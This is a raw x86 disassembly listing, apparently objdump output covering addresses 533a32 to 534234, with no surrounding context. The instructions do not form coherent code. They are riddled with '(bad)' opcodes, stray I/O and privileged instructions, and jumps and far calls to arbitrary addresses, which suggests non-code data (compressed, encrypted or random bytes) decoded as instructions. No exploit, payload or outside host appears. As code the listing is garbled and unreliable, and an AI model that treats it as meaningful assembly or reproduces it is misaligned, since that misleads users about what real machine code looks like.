  533a32:	mov    bh,0xd2
  533a34:	int    0xcb
  533a36:	add    eax,0xb38bcede
  533a3b:	cli    
  533a3c:	imul   eax,DWORD PTR [esi-0x708289a7],0x18388d
  533a46:	nop
  533a47:	ja     0x533a26
  533a49:	mov    edx,0x142e1b24
  533a4e:	jl     0x5339f1
  533a50:	inc    eax
  533a51:	adc    BYTE PTR [edx],0x1e
  533a54:	pop    ecx
  533a55:	outs   dx,BYTE PTR ds:[esi]
  533a56:	sub    dh,BYTE PTR [ecx+0x2a4d9dcd]
  533a5c:	scas   al,BYTE PTR es:[edi]
  533a5d:	mov    ds:0x69542b61,al
  533a62:	cwde   
  533a63:	jmp    0x6f4a:0x745f319d
  533a6a:	arpl   dx,bx
  533a6c:	add    dl,BYTE PTR [eax-0x1827942c]
  533a72:	jno    0x533a9a
  533a74:	das    
  533a75:	gs in  eax,dx
  533a77:	pop    ecx
  533a78:	adc    BYTE PTR [ebx-0xa52c769],ch
  533a7e:	add    ah,BYTE PTR [ebx+0x56]
  533a81:	out    dx,eax
  533a82:	ins    DWORD PTR es:[edi],dx
  533a83:	int    0x90
  533a85:	je     0x533a66
  533a87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  533a88:	dec    ebx
  533a89:	es enter 0xa08e,0xfc
  533a8e:	std    
  533a8f:	xchg   esi,eax
  533a90:	mov    ebx,0x2711d0dd
  533a95:	js     0x533ab7
  533a97:	ret    
  533a98:	icebp  
  533a99:	xlat   BYTE PTR ds:[ebx]
  533a9a:	out    dx,eax
  533a9b:	sti    
  533a9c:	aas    
  533a9d:	cld    
  533a9e:	mov    ebx,0x15ede8b2
  533aa3:	ror    DWORD PTR [edx],1
  533aa5:	leave  
  533aa6:	das    
  533aa7:	adc    dl,bl
  533aa9:	and    DWORD PTR ds:0x38db7e66,0x23b78e2
  533ab3:	js     0x533a89
  533ab5:	pushf  
  533ab6:	je     0x533adc
  533ab8:	(bad)  
  533abc:	adc    eax,0x562c2529
  533ac1:	cli    
  533ac2:	pop    ebp
  533ac3:	lahf   
  533ac4:	into   
  533ac5:	fisub  WORD PTR [esi+0x0]
  533ac8:	cmp    ebp,ebx
  533aca:	sbb    edi,0x9
  533acd:	test   al,0x41
  533acf:	mov    ebx,0x6edb947f
  533ad4:	xchg   ecx,eax
  533ad5:	mov    ch,0x1c
  533ad7:	aaa    
  533ad8:	mov    eax,0xfe33657b
  533add:	shl    DWORD PTR [ebx+0x4b967950],cl
  533ae3:	xor    BYTE PTR [ebp+0x2ce62cf0],bh
  533ae9:	call   esi
  533aeb:	mov    cl,0xce
  533aed:	jno    0x533afa
  533aef:	mov    ebx,DWORD PTR [eax+0x13e0716f]
  533af5:	das    
  533af6:	test   eax,0x171252d1
  533afb:	imul   DWORD PTR [edi+0x20]
  533afe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  533aff:	rcl    BYTE PTR [edx-0x1f9e9fdf],0x7
  533b06:	sub    DWORD PTR [ecx+0x1748496a],esp
  533b0c:	ret    
  533b0d:	sbb    eax,0xcee1d4a3
  533b12:	loopne 0x533ac4
  533b14:	scas   eax,DWORD PTR es:[edi]
  533b15:	pop    ss
  533b16:	lea    edi,[ecx-0x7b]
  533b19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  533b1a:	icebp  
  533b1b:	inc    eax
  533b1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  533b1d:	inc    esi
  533b1e:	into   
  533b1f:	fxch   st(2)
  533b21:	std    
  533b22:	test   BYTE PTR [eax],ah
  533b24:	repz jbe 0x533af7
  533b27:	inc    ebp
  533b28:	nop
  533b29:	mov    eax,ds:0xd6175d7
  533b2e:	test   eax,0x761d6bf6
  533b33:	xchg   DWORD PTR [ecx-0x5a],edx
  533b36:	xchg   esp,eax
  533b37:	mov    edi,0x465b588d
  533b3c:	pop    ss
  533b3d:	ins    BYTE PTR es:[edi],dx
  533b3e:	push   es
  533b3f:	aaa    
  533b40:	push   edx
  533b41:	sub    BYTE PTR [ecx+0x49],bl
  533b44:	retf   
  533b45:	pop    edx
  533b46:	pop    ebx
  533b47:	jno    0x533b91
  533b49:	pusha  
  533b4a:	xor    BYTE PTR [ecx+0x6a0cb6e1],0x35
  533b51:	(bad)  
  533b52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  533b53:	sti    
  533b54:	add    edi,edi
  533b56:	std    
  533b57:	ret    0xa207
  533b5a:	xchg   esi,eax
  533b5b:	fcomi  st,st(4)
  533b5d:	shl    BYTE PTR ds:0xb870dce6,cl
  533b63:	out    dx,eax
  533b64:	mov    bh,0x98
  533b66:	pusha  
  533b67:	and    esp,0x1819da72
  533b6d:	dec    esi
  533b6e:	mov    al,ds:0x8bc2413a
  533b73:	sub    BYTE PTR [ebx-0x6fd8156a],bl
  533b79:	sbb    DWORD PTR [edi],esi
  533b7b:	adc    eax,0x5119cda7
  533b80:	dec    ebp
  533b81:	mov    DWORD PTR [edx],ebx
  533b83:	ror    BYTE PTR [ebx+0x6707753],1
  533b89:	cmp    BYTE PTR [ebp-0x5],dl
  533b8c:	adc    DWORD PTR ds:0xaf755cea,edi
  533b92:	lahf   
  533b93:	pop    eax
  533b94:	popa   
  533b95:	loopne 0x533b42
  533b97:	gs in  eax,dx
  533b99:	js     0x533bcc
  533b9b:	popf   
  533b9c:	jo     0x533b6b
  533b9e:	std    
  533b9f:	push   fs
  533ba1:	xchg   edx,eax
  533ba2:	adc    BYTE PTR [edi+0x76b82e4],dl
  533ba8:	rcl    ch,1
  533baa:	pop    ebp
  533bab:	mov    eax,ds:0x77e94e69
  533bb0:	fiadd  WORD PTR [eax-0x10]
  533bb3:	fbld   TBYTE PTR [ecx]
  533bb5:	xor    eax,0x1ff466c0
  533bba:	jo     0x533c30
  533bbc:	jmp    0x31e84723
  533bc1:	xor    al,0x74
  533bc3:	pop    ss
  533bc4:	push   es
  533bc5:	(bad)  
  533bc6:	(bad)  
  533bc7:	out    0x5d,al
  533bc9:	and    ecx,ebp
  533bcb:	jns    0x533c10
  533bcd:	fidiv  WORD PTR [edx]
  533bcf:	scas   eax,DWORD PTR es:[edi]
  533bd0:	ret    
  533bd1:	adc    al,0xb6
  533bd3:	cmp    DWORD PTR [eax-0x7034ba9a],esp
  533bd9:	pop    ecx
  533bda:	ds xchg ebx,eax
  533bdc:	sub    ah,BYTE PTR [edi+0x64]
  533bdf:	xor    DWORD PTR [edi+eax*1-0x4c],edx
  533be3:	imul   ebx,DWORD PTR [esi-0x30e6626d],0xd9b52ffd
  533bed:	push   es
  533bee:	imul   ebx
  533bf0:	push   es
  533bf1:	fisttp WORD PTR [ecx+0xa]
  533bf4:	adc    DWORD PTR [eax+0x21],eax
  533bf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  533bf8:	dec    eax
  533bf9:	pop    ecx
  533bfa:	dec    edx
  533bfb:	je     0x533bc3
  533bfd:	(bad)  
  533bff:	push   cs
  533c00:	inc    ebx
  533c01:	dec    esi
  533c02:	cmp    eax,0xc9065dc2
  533c07:	inc    edx
  533c08:	xchg   ebp,eax
  533c09:	pop    edi
  533c0a:	push   ebx
  533c0b:	add    edx,edi
  533c0d:	add    ebp,ecx
  533c0f:	loopne 0x533bf1
  533c11:	repnz push eax
  533c13:	cld    
  533c14:	call   0x284baad5
  533c19:	pop    esp
  533c1a:	aaa    
  533c1b:	sbb    eax,ecx
  533c1d:	or     BYTE PTR [edx-0x5a],ah
  533c20:	jecxz  0x533c6e
  533c22:	ffreep st(5)
  533c24:	push   edx
  533c25:	clc    
  533c26:	push   0x61b144e2
  533c2b:	and    BYTE PTR [bx+di],bl
  533c2e:	rcr    BYTE PTR [eax+0x1c],1
  533c31:	das    
  533c32:	or     ecx,ecx
  533c34:	mov    WORD PTR [eax+edx*2+0x2a3ab907],?
  533c3b:	push   0x39
  533c3d:	pop    ebp
  533c3e:	mov    esp,0x9b20586f
  533c43:	aam    0xb9
  533c45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  533c46:	inc    esi
  533c47:	push   0xffffffc5
  533c49:	jnp    0x533c07
  533c4b:	push   eax
  533c4c:	add    esi,ebp
  533c4e:	imul   esp,DWORD PTR [esi-0x2b6493f5],0xffffff9c
  533c55:	cmp    ah,BYTE PTR [edx-0x42]
  533c58:	jmp    0xbf207391
  533c5d:	int3   
  533c5e:	in     al,0x12
  533c60:	push   ss
  533c61:	jg     0x533bea
  533c63:	push   ebp
  533c64:	push   ds
  533c65:	call   0x8c8e88a0
  533c6a:	jl     0x533c5c
  533c6c:	sbb    DWORD PTR [eax],edi
  533c6e:	stc    
  533c6f:	mov    bl,0xfd
  533c71:	cmc    
  533c72:	push   edx
  533c73:	adc    eax,0xa53ae0b3
  533c78:	fistp  DWORD PTR [ebp+esi*8-0x22]
  533c7c:	cdq    
  533c7d:	push   cs
  533c7e:	cdq    
  533c7f:	ret    
  533c80:	cmc    
  533c81:	clc    
  533c82:	pop    edx
  533c83:	retf   
  533c84:	mov    ebx,0xdfe0b81f
  533c89:	lds    ebx,FWORD PTR [ecx+edi*4+0x35d7e189]
  533c90:	lods   eax,DWORD PTR ds:[esi]
  533c91:	lods   al,BYTE PTR ds:[esi]
  533c92:	xor    DWORD PTR [eax+eax*8+0x1a],esp
  533c96:	push   DWORD PTR [esp+eiz*4]
  533c99:	sbb    BYTE PTR [edi-0x7ee2b864],0x68
  533ca0:	mov    ebx,0x97b57233
  533ca5:	sti    
  533ca6:	call   0x9dc5:0x2108
  533cac:	sub    ah,BYTE PTR [edx+ecx*2-0x4197a2a9]
  533cb3:	lahf   
  533cb4:	add    dl,BYTE PTR [esi+0x58a204e5]
  533cba:	and    bh,BYTE PTR [edi-0x6567bf58]
  533cc0:	out    dx,eax
  533cc1:	imul   ebp,esi,0x7be531e7
  533cc7:	and    eax,0x792f43f3
  533ccc:	(bad)  
  533ccd:	or     al,0xfa
  533ccf:	jp     0x533cef
  533cd1:	push   es
  533cd2:	ror    BYTE PTR [edx],1
  533cd4:	xchg   ebp,eax
  533cd5:	leave  
  533cd6:	jne    0x533d39
  533cd8:	xor    al,0x6f
  533cda:	call   0x6ce6:0x4a7c28a
  533ce1:	push   edi
  533ce2:	pop    ss
  533ce3:	add    eax,0xa708ce40
  533ce8:	mov    dh,0x4
  533cea:	pop    edx
  533ceb:	out    dx,al
  533cec:	mov    al,ds:0xd12e36fe
  533cf1:	inc    eax
  533cf2:	jae    0x533ce5
  533cf4:	ss or  eax,0x1f38e89c
  533cfa:	mov    bl,bh
  533cfc:	add    bl,0x33
  533cff:	sbb    ecx,DWORD PTR [edx+0x406de43]
  533d05:	or     DWORD PTR [eax+0x1d],0x68daa67f
  533d0c:	repz mov bh,0x2c
  533d0f:	push   ss
  533d10:	js     0x533d79
  533d12:	and    ebp,DWORD PTR [edx]
  533d14:	push   esi
  533d15:	sti    
  533d16:	adc    edx,esi
  533d18:	xchg   esp,eax
  533d19:	or     DWORD PTR [edx-0x788e01fd],ebx
  533d1f:	dec    edx
  533d20:	nop
  533d21:	cmp    eax,0x9f84a504
  533d26:	sbb    ebp,DWORD PTR [edi]
  533d28:	xchg   esi,eax
  533d29:	push   esi
  533d2a:	imul   edi,ebp,0x78a7448c
  533d30:	call   0xb22e8dfb
  533d35:	adc    ebp,DWORD PTR [ecx-0x79]
  533d38:	sar    BYTE PTR [edi-0x6856f9d9],0x8
  533d3f:	push   ss
  533d40:	inc    eax
  533d41:	add    eax,0x74fdc82
  533d46:	stc    
  533d47:	push   ebx
  533d48:	cwde   
  533d49:	and    dh,dl
  533d4b:	ret    0xdd27
  533d4e:	and    BYTE PTR [ebp-0x4a574a34],dh
  533d54:	dec    esi
  533d55:	fld    DWORD PTR [ecx+0x44]
  533d58:	lods   al,BYTE PTR ds:[esi]
  533d59:	push   eax
  533d5a:	inc    edx
  533d5b:	push   es
  533d5c:	call   0x2db68a1
  533d61:	dec    esi
  533d62:	out    0xd7,eax
  533d64:	pusha  
  533d65:	aaa    
  533d66:	mul    DWORD PTR [eax]
  533d68:	push   edi
  533d69:	packuswb mm4,QWORD PTR [eax+eax*2-0x2aa9c1d0]
  533d71:	xchg   edx,eax
  533d72:	jae    0x533d68
  533d74:	es retf 
  533d76:	mov    ebx,0x3986e79f
  533d7b:	enter  0xaa24,0x20
  533d7f:	retf   
  533d80:	aas    
  533d81:	mul    DWORD PTR [edx+0xf]
  533d84:	mov    bl,0x2a
  533d86:	push   cs
  533d87:	pop    ds
  533d88:	es mov ebx,0x58ffb2b2
  533d8e:	aaa    
  533d8f:	scas   al,BYTE PTR es:[edi]
  533d90:	jmp    0x533d3d
  533d92:	mov    ebx,0xb5aa7c45
  533d97:	sbb    ch,BYTE PTR [edx+0x739c0ee]
  533d9d:	sbb    ecx,DWORD PTR [esi-0x66058c56]
  533da3:	xor    ecx,eax
  533da5:	bound  ebx,QWORD PTR [eax-0x6e]
  533da8:	pop    ebx
  533da9:	pop    ebx
  533daa:	cli    
  533dab:	out    dx,eax
  533dac:	and    eax,0xaa3af1e
  533db1:	push   eax
  533db2:	xor    eax,0xd9f8a916
  533db7:	mov    edi,0x95c740f7
  533dbc:	cmp    dl,ch
  533dbe:	js     0x533e10
  533dc0:	fisttp DWORD PTR [eax-0x1d]
  533dc3:	jns    0x533da4
  533dc5:	out    0x32,eax
  533dc7:	test   al,0xea
  533dc9:	imul   ebx,DWORD PTR [ebx-0x14ca0907],0x3276e77c
  533dd3:	sub    ch,0xe
  533dd6:	inc    edx
  533dd7:	adc    BYTE PTR [esp+eax*1],0x4b
  533ddb:	dec    edi
  533ddc:	popf   
  533ddd:	repz clc 
  533ddf:	sbb    BYTE PTR [ebp-0x5359fac0],dl
  533de5:	inc    esp
  533de6:	push   esi
  533de7:	adc    bl,BYTE PTR [ebp+0x52]
  533dea:	jns    0x533d82
  533dec:	xchg   edi,eax
  533ded:	call   0xb640:0x615a9262
  533df4:	neg    DWORD PTR [edx+ecx*1+0xdec2d24]
  533dfb:	dec    ecx
  533dfc:	and    BYTE PTR [edx],bl
  533dfe:	lea    ebx,[esi-0x38cacd5]
  533e04:	ins    BYTE PTR es:[edi],dx
  533e05:	xor    DWORD PTR [eax],eax
  533e07:	addr16 call 0x24d7:0x59a6
  533e0e:	aam    0x9e
  533e10:	daa    
  533e11:	sbb    eax,0x9ad7ccf2
  533e16:	neg    BYTE PTR [ebp+0x49]
  533e19:	cdq    
  533e1a:	leave  
  533e1b:	aaa    
  533e1c:	mov    BYTE PTR [edx-0x42],bh
  533e1f:	lock das 
  533e21:	xchg   esi,eax
  533e22:	mov    ds:0xf812e64f,eax
  533e27:	fidivr DWORD PTR [ebx+0x2b58c27a]
  533e2d:	std    
  533e2e:	dec    eax
  533e2f:	or     ecx,DWORD PTR [ebp-0x799d06db]
  533e35:	and    BYTE PTR [ebx+0x28],dl
  533e38:	test   eax,0xcc3952e0
  533e3d:	call   0xd668:0x931169f0
  533e44:	push   esp
  533e45:	(bad)  
  533e46:	mul    ebp
  533e48:	stc    
  533e49:	and    dh,BYTE PTR [ebx-0x69b7f2c8]
  533e4f:	inc    esp
  533e50:	mov    ecx,0xee5cf35a
  533e55:	les    ecx,FWORD PTR [edx+0x5738ea00]
  533e5b:	repnz push 0xdc6e9986
  533e61:	push   ebp
  533e62:	push   0xffffff83
  533e64:	inc    esi
  533e65:	mov    esi,0x2464a5d9
  533e6a:	jne    0x533ec8
  533e6c:	aaa    
  533e6d:	mov    eax,0xad57cfa5
  533e72:	cmp    eax,0x8f13571c
  533e77:	test   esp,edi
  533e79:	aas    
  533e7a:	pop    edi
  533e7b:	push   cs
  533e7c:	jmp    0xbd91cb51
  533e81:	(bad)  
  533e82:	data16 or dh,bh
  533e85:	dec    eax
  533e86:	jo     0x533e6c
  533e88:	jmp    0x3acbc048
  533e8d:	xor    eax,0xe2fe4a37
  533e92:	adc    eax,0x50f1d141
  533e97:	test   eax,0x94939196
  533e9c:	xchg   DWORD PTR [ebx],esi
  533e9e:	cs push ecx
  533ea0:	push   edx
  533ea1:	sub    al,0x24
  533ea3:	lds    ebx,FWORD PTR [ebp-0x30]
  533ea6:	cmp    esp,DWORD PTR [edi-0x744f885e]
  533eac:	ret    0xa1db
  533eaf:	call   0x714c4081
  533eb4:	xchg   BYTE PTR [edx],dh
  533eb6:	sbb    BYTE PTR [ebp+0x40],ch
  533eb9:	mov    dl,0x37
  533ebb:	mov    WORD PTR [edx+0x7f7fce5d],ss
  533ec1:	stos   BYTE PTR es:[edi],al
  533ec2:	inc    ebx
  533ec3:	rcl    DWORD PTR [eax],cl
  533ec5:	test   eax,0xbbbf7d9a
  533eca:	aas    
  533ecb:	adc    BYTE PTR [edx+edi*1+0xf],cl
  533ecf:	adc    eax,0xc42ac8b2
  533ed4:	lods   eax,DWORD PTR ds:[esi]
  533ed5:	inc    esi
  533ed6:	punpckldq mm7,DWORD PTR [eax+0x10]
  533eda:	inc    ebp
  533edb:	xchg   esi,eax
  533edc:	push   ds
  533edd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  533ede:	ret    0x7a4e
  533ee1:	xchg   esp,eax
  533ee2:	sbb    BYTE PTR [eax+0x4989ae96],cl
  533ee8:	inc    edi
  533ee9:	pop    eax
  533eea:	into   
  533eeb:	sub    bl,BYTE PTR [edi+eax*8]
  533eee:	bound  eax,QWORD PTR ds:0x17114dd4
  533ef4:	test   al,dl
  533ef6:	inc    ebx
  533ef7:	shl    edx,1
  533ef9:	mov    ds:0xebe52aac,eax
  533efe:	lahf   
  533eff:	gs data16 jge 0x533f76
  533f03:	xchg   DWORD PTR [edi+0x6e],edi
  533f06:	test   DWORD PTR [esi+0x538a834c],esp
  533f0c:	sbb    al,0xf9
  533f0e:	outs   dx,BYTE PTR ds:[esi]
  533f0f:	mov    ch,0x25
  533f11:	cwde   
  533f12:	mov    esi,0xad5ba368
  533f17:	dec    ecx
  533f18:	add    ebp,DWORD PTR ds:[edi+eiz*4+0x54]
  533f1d:	cmp    DWORD PTR [esp+edi*2],esi
  533f20:	push   ebx
  533f21:	or     al,0x26
  533f23:	stc    
  533f24:	inc    ch
  533f26:	out    dx,eax
  533f27:	mov    ecx,0x7f4ee2f3
  533f2c:	cli    
  533f2d:	dec    ecx
  533f2e:	adc    eax,0xfd9d5159
  533f33:	(bad)  
  533f34:	call   0xad73:0xaf90f711
  533f3b:	jmp    0x533ecc
  533f3d:	shl    DWORD PTR es:[eax],cl
  533f40:	dec    ecx
  533f41:	xor    BYTE PTR [ecx],ah
  533f43:	adc    al,0xf9
  533f45:	xchg   ebx,eax
  533f46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  533f47:	cli    
  533f48:	push   ebp
  533f49:	xchg   edi,eax
  533f4a:	or     al,0xd5
  533f4c:	mov    al,BYTE PTR [ebx]
  533f4e:	ins    DWORD PTR es:[edi],dx
  533f4f:	adc    dl,BYTE PTR [edx+0x37]
  533f52:	xchg   ecx,edx
  533f54:	sar    ecx,1
  533f56:	aam    0x26
  533f58:	adc    DWORD PTR [ecx],0x49
  533f5b:	movq   QWORD PTR [eax-0x36],mm1
  533f5f:	lods   al,BYTE PTR ds:[esi]
  533f60:	mov    ecx,0x739155a8
  533f65:	jmp    0x387e:0x2bebc59e
  533f6c:	jne    0x533fe6
  533f6e:	push   edi
  533f6f:	pop    ebp
  533f70:	test   DWORD PTR [edx],esi
  533f72:	push   es
  533f73:	cmc    
  533f74:	jmp    0xdb79281c
  533f79:	push   ebx
  533f7a:	xchg   esp,eax
  533f7b:	sub    eax,0x3da0be9d
  533f80:	mov    DWORD PTR ds:0x4141e5c4,esi
  533f86:	adc    edi,esp
  533f88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  533f89:	data16 das 
  533f8b:	fnstenv [ebp-0x44]
  533f8e:	pop    eax
  533f8f:	push   ss
  533f90:	push   cs
  533f91:	and    BYTE PTR [eax-0x313f6a82],dh
  533f97:	ins    BYTE PTR es:[edi],dx
  533f98:	sbb    eax,0x9db439ef
  533f9d:	pop    edi
  533f9e:	dec    ebp
  533f9f:	popa   
  533fa0:	inc    ebx
  533fa1:	test   ebx,esi
  533fa3:	out    dx,eax
  533fa4:	jns    0x533fcf
  533fa6:	loopne 0x533f80
  533fa8:	push   ss
  533fa9:	push   ss
  533faa:	xchg   ebp,eax
  533fab:	pop    ebp
  533fac:	fwait
  533fad:	add    al,0xbc
  533faf:	mov    dh,0x57
  533fb1:	jbe    0x533ff6
  533fb3:	sub    al,0x56
  533fb5:	sti    
  533fb6:	jnp    0x533f69
  533fb8:	aaa    
  533fb9:	mov    eax,ds:0xf3349043
  533fbe:	pop    ecx
  533fbf:	sub    DWORD PTR es:0x1cd386ae,0x18
  533fc7:	mov    al,ds:0x5709914c
  533fcc:	sti    
  533fcd:	xchg   ebp,eax
  533fce:	push   ds
  533fcf:	cmp    al,0xf4
  533fd1:	(bad)  
  533fd2:	ins    DWORD PTR es:[edi],dx
  533fd3:	in     eax,dx
  533fd4:	xor    BYTE PTR [esi-0xf],al
  533fd7:	(bad)  
  533fd8:	stc    
  533fd9:	sbb    BYTE PTR [ecx+0xe70ac90],bl
  533fdf:	mov    ebx,0x7601f7dd
  533fe4:	dec    ecx
  533fe5:	ds push ds
  533fe7:	int3   
  533fe8:	mov    dl,0x62
  533fea:	rcl    ecx,0x24
  533fed:	sar    BYTE PTR [edx+0x5da894b8],1
  533ff3:	sbb    BYTE PTR [edx-0x336df7a2],cl
  533ff9:	fsub   QWORD PTR [eax-0x22cf8541]
  533fff:	mov    dl,0x41
  534001:	push   ecx
  534002:	push   ss
  534003:	ja     0x533fde
  534005:	mov    DWORD PTR [edx+ebx*2+0x53],edx
  534009:	inc    ebx
  53400a:	mov    dl,0x4
  53400c:	xchg   ebp,eax
  53400d:	out    0x33,eax
  53400f:	dec    esi
  534010:	pop    esp
  534011:	inc    ebx
  534012:	jmp    0x6c179226
  534017:	push   0x2688437a
  53401c:	ins    DWORD PTR es:[edi],dx
  53401d:	(bad)  
  53401e:	aam    0x7a
  534020:	imul   edi,DWORD PTR [ebx],0xb57e13e5
  534026:	push   0x5a
  534028:	jmp    0xe12fc5b6
  53402d:	push   esp
  53402e:	ret    
  53402f:	aas    
  534030:	sahf   
  534031:	xor    eax,0x5d4700d7
  534036:	sbb    eax,0xce173f03
  53403b:	ret    
  53403c:	inc    edx
  53403d:	or     eax,0x5e75022d
  534042:	sti    
  534043:	push   0xffffff92
  534045:	lahf   
  534046:	add    al,0x87
  534048:	add    al,0x6c
  53404a:	and    eax,0xab56f111
  53404f:	cmp    ebx,DWORD PTR [ebp+0x53]
  534052:	cld    
  534053:	(bad)  
  534054:	cmp    eax,0xf1ac4671
  534059:	mov    eax,0x8699b253
  53405e:	mov    ah,0xbc
  534060:	mov    al,0x9b
  534062:	add    al,0xe2
  534064:	cmc    
  534065:	(bad)  
  534067:	push   ecx
  534068:	stos   BYTE PTR es:[edi],al
  534069:	fldl2t 
  53406b:	enter  0x6d56,0xa7
  53406f:	sar    DWORD PTR [ebx],0x3b
  534072:	fimul  DWORD PTR [edi+0xb]
  534075:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  534076:	es das 
  534078:	popf   
  534079:	ja     0x53402a
  53407b:	iret   
  53407c:	(bad)  
  53407d:	retf   0xb340
  534080:	je     0x534010
  534082:	mov    esp,0x206a43d3
  534087:	mov    ebp,0x9408b29a
  53408c:	ds push ss
  53408e:	ss inc eax
  534090:	sbb    DWORD PTR [edi-0x26],ecx
  534093:	push   eax
  534094:	push   esp
  534095:	sub    BYTE PTR [edx-0x4cbd0f49],dh
  53409b:	adc    eax,0x69646d58
  5340a0:	xchg   edi,eax
  5340a1:	in     eax,dx
  5340a2:	xor    al,BYTE PTR [ebp-0x6f]
  5340a5:	cmp    ecx,edi
  5340a7:	mov    ah,0x4c
  5340a9:	pop    ecx
  5340aa:	addr16 jnp 0x53409e
  5340ad:	int3   
  5340ae:	test   eax,0xaf578424
  5340b3:	xchg   ebx,eax
  5340b4:	pop    esi
  5340b5:	sub    esp,DWORD PTR [ecx]
  5340b7:	pop    ss
  5340b8:	mov    ah,0x69
  5340ba:	mov    ch,0xcf
  5340bc:	in     eax,dx
  5340bd:	loope  0x5340d3
  5340bf:	dec    edi
  5340c0:	cmc    
  5340c1:	mov    ebx,0x929b5d16
  5340c6:	xchg   ecx,eax
  5340c7:	lahf   
  5340c8:	arpl   WORD PTR [edx+0x2e],cx
  5340cb:	add    BYTE PTR [ecx-0x16b5c47c],dl
  5340d1:	adc    eax,0xd0070e2
  5340d6:	push   eax
  5340d7:	into   
  5340d8:	pop    ebp
  5340d9:	mov    al,0x46
  5340db:	inc    eax
  5340dc:	popf   
  5340dd:	push   ebp
  5340de:	sbb    BYTE PTR [edx-0x1d796fbc],0x25
  5340e5:	ret    
  5340e6:	in     al,0x48
  5340e8:	retf   
  5340e9:	cli    
  5340ea:	mov    BYTE PTR [ecx-0x7f8ecebd],dh
  5340f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5340f1:	imul   esi,DWORD PTR ds:0xe0511acc,0xfffffff7
  5340f8:	jl     0x5340e0
  5340fa:	pop    ecx
  5340fb:	fs push esi
  5340fd:	pop    esp
  5340fe:	cs (bad) 
  534100:	ret    
  534101:	gs aas 
  534103:	xchg   edx,eax
  534104:	adc    cl,ah
  534106:	mov    DWORD PTR ds:0xf89564d9,ebp
  53410c:	mov    ebp,DWORD PTR [edi]
  53410e:	push   ebp
  53410f:	(bad)  
  534110:	stos   BYTE PTR es:[edi],al
  534111:	lods   al,BYTE PTR ds:[esi]
  534112:	dec    esp
  534113:	fcom   QWORD PTR [ebx+ebp*1-0x70]
  534117:	push   0x35115631
  53411c:	or     al,dl
  53411e:	popa   
  53411f:	and    dh,BYTE PTR [ecx+0x5a]
  534122:	mov    esp,0xf9d30d77
  534127:	mov    al,0x82
  534129:	pop    esp
  53412a:	inc    esi
  53412b:	cld    
  53412c:	int    0x37
  53412e:	mov    dh,0xf3
  534130:	aas    
  534131:	sar    BYTE PTR [ebp-0x39],1
  534134:	push   edx
  534135:	shl    DWORD PTR [ebp-0x1a2e0e54],cl
  53413b:	mov    dl,0xdb
  53413d:	xor    BYTE PTR [ebx-0x5da0fd17],cl
  534143:	cmp    ch,BYTE PTR [ecx+0x1690de28]
  534149:	inc    DWORD PTR gs:[ecx-0x3]
  53414d:	mov    DWORD PTR ds:0x9ca01c4b,eax
  534153:	jnp    0x5340ec
  534155:	jb     0x534199
  534157:	mov    ch,0xaf
  534159:	ss jns 0x534122
  53415c:	hlt    
  53415d:	or     edx,edi
  53415f:	mov    esp,0x838fdc06
  534164:	adc    ebx,ebp
  534166:	push   ecx
  534167:	imul   ah
  534169:	push   0x43cc2e59
  53416e:	xor    ebx,DWORD PTR [esi]
  534170:	aad    0x2a
  534172:	mov    ebp,0xd84c4b51
  534177:	sub    DWORD PTR ds:0x736222c1,ecx
  53417d:	push   ecx
  53417e:	dec    esp
  53417f:	ins    BYTE PTR es:[edi],dx
  534180:	push   0xffffffa0
  534182:	popa   
  534183:	cwde   
  534184:	retf   0x5687
  534187:	pop    es
  534188:	mov    eax,ds:0x6fdb897e
  53418d:	fwait
  53418e:	cli    
  53418f:	div    DWORD PTR [ecx-0xf]
  534192:	push   ss
  534193:	xor    cl,BYTE PTR [ebp-0x24]
  534196:	adc    BYTE PTR [ebp-0x3f],bl
  534199:	jno    0x5341a5
  53419b:	xchg   dh,dh
  53419d:	out    dx,eax
  53419e:	and    ebx,edx
  5341a0:	adc    DWORD PTR [ebx],0x73c790a6
  5341a6:	ins    DWORD PTR es:[edi],dx
  5341a7:	dec    eax
  5341a8:	aas    
  5341a9:	sub    eax,0xd633eb84
  5341ae:	mov    esp,DWORD PTR [edx]
  5341b0:	jge    0x534192
  5341b2:	ins    DWORD PTR es:[edi],dx
  5341b3:	adc    DWORD PTR [ecx+0x74c1d187],0x82949d0
  5341bd:	jbe    0x5341b6
  5341bf:	fs push 0xe2e3f830
  5341c5:	xchg   ch,dl
  5341c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5341c8:	enter  0xc77f,0x19
  5341cc:	mov    edi,gs
  5341ce:	mul    BYTE PTR [edx-0x2b]
  5341d1:	sar    BYTE PTR [edi+0x5d],1
  5341d4:	test   edi,ebx
  5341d6:	xor    al,BYTE PTR [esi+0x2c48962e]
  5341dc:	into   
  5341dd:	adc    al,0x4f
  5341df:	mov    eax,ds:0x62332d0
  5341e4:	fisttp DWORD PTR [esi+0x6992ccad]
  5341ea:	xchg   esp,eax
  5341eb:	xchg   ebx,eax
  5341ec:	add    DWORD PTR [ecx+0x23],0xffffff88
  5341f0:	out    0xe2,al
  5341f2:	jmp    0x534266
  5341f4:	jmp    0x160ae002
  5341f9:	icebp  
  5341fa:	aam    0x84
  5341fc:	fadd   QWORD PTR [edx-0x1587ac8a]
  534202:	xchg   BYTE PTR [eax],bl
  534204:	or     DWORD PTR [ebx],edx
  534206:	lea    ecx,[ecx-0x578f7e6e]
  53420c:	jge    0x53423c
  53420e:	fs mov ebp,0x7c0a07e7
  534214:	outs   dx,DWORD PTR ds:[esi]
  534215:	push   edi
  534216:	mov    esi,?
  534218:	sub    DWORD PTR [edx+0x72],esi
  53421b:	xor    DWORD PTR [eax+0x25339287],ebx
  534221:	(bad)  
  534222:	fstp   DWORD PTR [ebx+0x4a71f57c]
  534228:	and    BYTE PTR [eax],bh
  53422a:	outs   dx,DWORD PTR ds:[esi]
  53422b:	call   0x3c660b50
  534230:	repnz (bad) 
  534232:	push   ds
  534233:	daa    
  534234:	(bad)  [ebx-0x42b87828]
